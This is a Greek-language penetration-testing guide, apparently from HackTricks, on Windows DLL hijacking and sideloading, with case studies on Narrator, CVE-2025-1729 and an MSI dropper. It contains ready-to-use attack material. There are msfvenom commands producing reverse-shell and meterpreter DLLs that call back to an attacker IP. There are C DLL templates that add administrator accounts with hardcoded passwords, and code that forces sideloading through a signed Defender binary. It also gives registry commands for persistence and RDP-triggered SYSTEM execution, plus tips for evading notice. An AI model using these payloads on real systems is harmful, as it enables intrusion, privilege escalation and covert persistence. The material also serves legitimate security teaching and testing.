# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει το χειρισμό μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός περιλαμβάνει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για code execution, για επίτευξη persistence και, λιγότερο συχνά, για privilege escalation. Παρά την εστίαση στην escalation εδώ, η μέθοδος του hijacking παραμένει συνεπής ανεξάρτητα από τον στόχο.

### Συνηθισμένες Τεχνικές

Χρησιμοποιούνται διάφορες μέθοδοι για DLL hijacking, η κάθε μία με τη δική της αποτελεσματικότητα ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης μπροστά από το νόμιμο, εκμεταλλευόμενοι το pattern αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL ώστε η εφαρμογή να το φορτώσει πιστεύοντας ότι είναι ένα απαραίτητο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το `%PATH%` ή αρχεία `.exe.manifest` / `.exe.local` για να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο στο WinSxS directory, μια μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν κατάλογο ελεγχόμενο από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, ομοιάζοντας με τεχνικές Binary Proxy Execution.

## Εύρεση ελλειπόντων Dlls

Ο πιο συνηθισμένος τρόπος να βρείτε ελλείποντα Dlls μέσα σε ένα σύστημα είναι να τρέξετε το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από τα sysinternals, **ρυθμίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και να εμφανίσετε μόνο την **File System Activity**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **missing dlls in general** αφήνετε αυτό να τρέξει για λίγα **seconds**.\
Αν ψάχνετε για ένα **missing dll inside an specific executable** πρέπει να βάλετε **άλλο φίλτρο όπως "Process Name" "contains" `<exec name>`, να το εκτελέσετε, και να σταματήσετε τη λήψη γεγονότων**.

## Exploiting Missing Dlls

Για να escalate privileges, η καλύτερη ευκαιρία που έχουμε είναι να μπορέσουμε να **γράψουμε ένα dll που μια privileged διαδικασία θα προσπαθήσει να φορτώσει** σε κάποιο από τα **μέρη όπου θα αναζητηθεί**. Επομένως, θα μπορέσουμε να **γράψουμε** ένα dll σε έναν **φάκελο** όπου το **dll αναζητείται πριν** από το φάκελο όπου βρίσκεται το **original dll** (περίεργη περίπτωση), ή να γράψουμε σε κάποιον φάκελο όπου το dll πρόκειται να αναζητηθεί και το αρχικό **dll δεν υπάρχει** σε κανέναν φάκελο.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Οι εφαρμογές Windows αναζητούν DLLs ακολουθώντας ένα σύνολο προκαθορισμένων διαδρομών αναζήτησης, με μια συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα επιβλαβές DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, εξασφαλίζοντας ότι θα φορτωθεί πριν από το αυθεντικό DLL. Μια λύση για να το αποτρέψουμε είναι να εξασφαλίσουμε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείτε να δείτε την **DLL search order on 32-bit** systems παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **default** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη λειτουργία, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και θέστε την σε 0 (η προεπιλογή είναι ενεργοποιημένη).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Τέλος, σημειώστε ότι **ένα dll μπορεί να φορτωθεί υποδεικνύοντας την απόλυτη διαδρομή αντί απλά το όνομα**. Σε αυτή την περίπτωση το dll **θα αναζητηθεί μόνο σε εκείνη τη διαδρομή** (αν το dll έχει dependencies, αυτά θα αναζητηθούν όπως και τα άλλα DLLs που φορτώνονται με όνομα).

Υπάρχουν και άλλοι τρόποι για να τροποποιηθεί η σειρά αναζήτησης αλλά δεν θα τους εξηγήσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος να επηρεάσετε αποφασιστικά τη DLL search path μιας νεοδημιουργημένης διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS όταν δημιουργείτε τη διαδικασία με τις native APIs του ntdll. Προσφέροντας έναν κατάλογο ελεγχόμενο από τον επιτιθέμενο εδώ, μια στοχευόμενη διαδικασία που επιλύει ένα εισαγόμενο DLL με το όνομα (χωρίς απόλυτη διαδρομή και χωρίς να χρησιμοποιεί τα safe loading flags) μπορεί να αναγκαστεί να φορτώσει ένα κακόβουλο DLL από εκείνον τον κατάλογο.

Κύρια ιδέα
- Συνθέστε τα process parameters με RtlCreateProcessParametersEx και δώστε ένα custom DllPath που δείχνει στον φάκελο που ελέγχετε (π.χ., τον κατάλογο όπου βρίσκεται ο dropper/unpacker σας).
- Δημιουργήστε τη διαδικασία με RtlCreateUserProcess. Όταν το στοχευόμενο binary επιλύει ένα DLL με όνομα, ο loader θα συμβουλευτεί το παρεχόμενο αυτό DllPath κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμα και όταν το κακόβουλο DLL δεν είναι colocated με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη child process που δημιουργείται· είναι διαφορετικό από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διαδικασία.
- Ο στόχος πρέπει να εισάγει ή να κάνει LoadLibrary σε ένα DLL με όνομα (χωρίς απόλυτη διαδρομή και χωρίς να χρησιμοποιεί LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs και σκληροκωδικοποιημένες απόλυτες διαδρομές δεν μπορούν να hijackαριστούν. Forwarded exports και SxS μπορούν να αλλάξουν την προτεραιότητα.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Τοποθετήστε ένα κακόβουλο xmllite.dll (εξάγοντας τις απαιτούμενες συναρτήσεις ή λειτουργώντας ως proxy στο πραγματικό) στον κατάλογο DllPath σας.
- Εκκινήστε ένα ψηφιακά υπογεγραμμένο binary που είναι γνωστό ότι αναζητά το xmllite.dll κατά όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί σε πραγματικές επιθέσεις να οδηγεί σε multi-stage sideloading chains: ένας αρχικός launcher ρίχνει ένα helper DLL, το οποίο στη συνέχεια spawnάρει ένα Microsoft-signed, hijackable binary με custom DllPath για να αναγκάσει τη φόρτωση του DLL του attacker από έναν staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- Όταν μια **DLL που μοιράζεται το όνομά της με μία που είναι ήδη φορτωμένη στη μνήμη** συναντάται, το σύστημα παρακάμπτει την συνήθη αναζήτηση. Αντίθετα, εκτελεί έναν έλεγχο για redirection και ένα manifest πριν προεπιλέξει την DLL που ήδη βρίσκεται στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για την DLL**.
- Σε περιπτώσεις όπου η DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοσή του της known DLL, μαζί με οποιεσδήποτε εξαρτώμενες DLLs, **παραβλέποντας τη διαδικασία αναζήτησης**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα αυτών των known DLLs.
- Εάν μια **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτές τις εξαρτώμενες DLLs πραγματοποιείται σαν να είχαν υποδειχθεί μόνο με τα **module names**, ανεξάρτητα από το αν η αρχική DLL ταυτοποιήθηκε μέσω πλήρους διαδρομής.

### Κλιμάκωση προνομίων

**Απαιτήσεις**:

- Εντοπίστε μια διαδικασία που λειτουργεί ή θα λειτουργήσει υπό **διαφορετικά προνόμια** (horizontal or lateral movement), η οποία **απουσιάζει από DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** για οποιονδήποτε **κατάλογο** στον οποίο θα **αναζητηθεί** η **DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου ή ένας κατάλογος μέσα στο system path.

Ναι, τα προαπαιτούμενα είναι δύσκολα να βρεθούν καθώς **από προεπιλογή είναι κάπως περίεργο να βρεις ένα privileged executable χωρίς μια dll** και είναι ακόμη **πιο παράξενο να έχεις write permissions σε έναν φάκελο του system path** (δεν μπορείς από προεπιλογή). Αλλά, σε εσφαλμένα διαμορφωμένα περιβάλλοντα αυτό είναι δυνατό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις προϋποθέσεις, μπορείτε να δείτε το project [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν ο **κύριος στόχος του project είναι το bypass UAC**, μπορεί να βρείτε εκεί ένα **PoC** για Dll hijacking για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανόν απλώς αλλάζοντας το path του φακέλου όπου έχετε write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τις imports ενός εκτελέσιμου και τις exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για πλήρη οδηγό για το πώς να **εκμεταλλευτείτε Dll Hijacking για να αναβαθμίσετε προνόμια** με δικαιώματα εγγραφής σε ένα **System Path folder** δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για να ανακαλύψετε αυτή την ευπάθεια είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλεύσετε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτό**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα του **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη για dll hijacking επικεντρωμένη στο dll hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με εξαγόμενες μη απαραίτητες συναρτήσεις**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Βασικά, ένας **Dll proxy** είναι ένα Dll ικανό να **εκτελεί τον κακόβουλο κώδικά σας όταν φορτωθεί**, αλλά επίσης να **εκθέτει** και να **λειτουργεί** όπως αναμένεται με το να **προωθεί όλες τις κλήσεις στη πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε ουσιαστικά να **ορίσετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **δημιουργήσετε ένα proxified dll** ή να **ορίσετε το Dll** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Λάβετε rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Απόκτηση ενός meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86 — δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ο δικός σας

Σημειώστε ότι σε αρκετές περιπτώσεις το Dll που μεταγλωττίζετε πρέπει να **export several functions** οι οποίες θα φορτωθούν από το victim process. Αν αυτές οι functions δεν υπάρχουν, το **binary won't be able to load** αυτές και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη Περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe εξακολουθεί να ελέγχει μια προβλέψιμη, γλωσσικά-ειδική localization DLL κατά την εκκίνηση που μπορεί να γίνει hijack για εκτέλεση αυθαίρετου κώδικα και persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Εάν ένα εγγράψιμο DLL ελεγχόμενο από επιτιθέμενο υπάρχει στη διαδρομή OneCore, αυτό φορτώνεται και εκτελείται `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Discovery with Procmon
- Φίλτρο: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης της παραπάνω διαδρομής.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ένα απλό hijack θα μιλήσει/επισημάνει το UI. Για να παραμείνετε σιωπηλοί, κατά το attach απαριθμήστε τα νήματα του Narrator, ανοίξτε το κύριο νήμα (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάντε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας νήμα. Δείτε PoC για πλήρες κώδικα.

Trigger and persistence via Accessibility configuration
- Σε επίπεδο χρήστη (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει τη φυτεμένη DLL. Στο secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσετε τον Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Επιτρέψτε το κλασικό επίπεδο ασφάλειας RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Κάντε RDP στον host, στην οθόνη σύνδεσης πατήστε CTRL+WIN+ENTER για να εκκινήσετε τον Narrator· η DLL σας εκτελείται ως SYSTEM στο secure desktop.
- Η εκτέλεση σταματά όταν η συνεδρία RDP κλείσει — κάντε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη Accessibility Tool (AT) καταχώρηση μητρώου (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισαγάγετε, και στη συνέχεια να θέσετε το `configuration` στο όνομα αυτού του AT. Αυτό δρομολογεί αυθαίρετη εκτέλεση υπό το Accessibility framework.

Σημειώσεις
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα admin.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Μελέτη περίπτωσης: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Η συγκεκριμένη περίπτωση δείχνει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), καταγεγραμμένο ως **CVE-2025-1729**.

### Λεπτομέρειες ευπάθειας

- **Συστατικό**: `TPQMAssistant.exe` που βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Προγραμματισμένη εργασία**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 AM υπό το συμφραζόμενο του συνδεδεμένου χρήστη.
- **Δικαιώματα καταλόγου**: Εγγράψιμο από `CREATOR OWNER`, επιτρέποντας σε τοπικούς χρήστες να τοποθετούν αυθαίρετα αρχεία.
- **Συμπεριφορά αναζήτησης DLL**: Προσπαθεί να φορτώσει `hostfxr.dll` από τον τρέχοντα κατάλογο εργασίας πρώτα και καταγράφει "NAME NOT FOUND" αν λείπει, υποδεικνύοντας προτεραιότητα αναζήτησης στον τοπικό κατάλογο.

### Υλοποίηση Exploit

Ένας επιτιθέμενος μπορεί να τοποθετήσει ένα κακόβουλο `hostfxr.dll` stub στον ίδιο κατάλογο, εκμεταλλευόμενος το ελλείπον DLL για να επιτύχει εκτέλεση κώδικα υπό το συμφραζόμενο του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή Επίθεσης

1. Ως κανονικός χρήστης, τοποθετήστε `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Εάν ένας διαχειριστής είναι συνδεδεμένος όταν η εργασία εκτελεστεί, το κακόβουλο DLL τρέχει στη συνεδρία του διαχειριστή με medium integrity.
4. Χρησιμοποιήστε τυπικές τεχνικές UAC bypass για ανύψωση από medium integrity σε SYSTEM privileges.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Οι δράστες απειλών συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό μια αξιόπιστη, signed διεργασία.

Chain overview
- Ο χρήστης κατεβάζει MSI. Μια CustomAction τρέχει αθόρυβα κατά την GUI εγκατάσταση (π.χ., LaunchApplication ή μια VBScript action), ανασυνθέτοντας το επόμενο στάδιο από embedded resources.
- Το dropper γράφει ένα νόμιμο, signed EXE και ένα κακόβουλο DLL στον ίδιο κατάλογο (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν το signed EXE εκκινείται, η σειρά αναζήτησης DLL των Windows φορτώνει wsc.dll από τον τρέχοντα κατάλογο πρώτο, εκτελώντας κώδικα του επιτιθέμενου υπό έναν signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Ψάξτε για εγγραφές που εκτελούν εκτελέσιμα ή VBScript. Παράδειγμα ύποπτου μοτίβου: LaunchApplication που εκτελεί ένα embedded αρχείο στο παρασκήνιο.
- Στο Orca (Microsoft Orca.exe), ελέγξτε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Embedded/split payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Ψάξτε για πολλά μικρά αποσπάσματα που συνενώνονται και αποκρυπτογραφούνται από μια VBScript CustomAction. Συνήθης ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτικό sideloading με wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος υπογεγραμμένος host (Avast). Η διεργασία προσπαθεί να φορτώσει το wsc.dll με το όνομα από τον κατάλογό της.
- wsc.dll: attacker DLL. Εάν δεν απαιτούνται συγκεκριμένες εξαγωγές, το DllMain αρκεί· διαφορετικά, κατασκευάστε ένα proxy DLL και προωθήστε τις απαιτούμενες εξαγωγές στη γνήσια βιβλιοθήκη ενώ εκτελείτε το payload στο DllMain.
- Κατασκευάστε ένα ελάχιστο DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για τις απαιτήσεις εξαγωγής, χρησιμοποιήστε ένα proxying framework (π.χ., DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που επίσης εκτελεί το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονόματος DLL από το host binary. Εάν ο host χρησιμοποιεί απόλυτες διαδρομές ή flags ασφαλούς φόρτωσης (π.χ., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack ενδέχεται να αποτύχει.
- Τα KnownDLLs, SxS, και τα forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του export set.

## Αναφορές

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
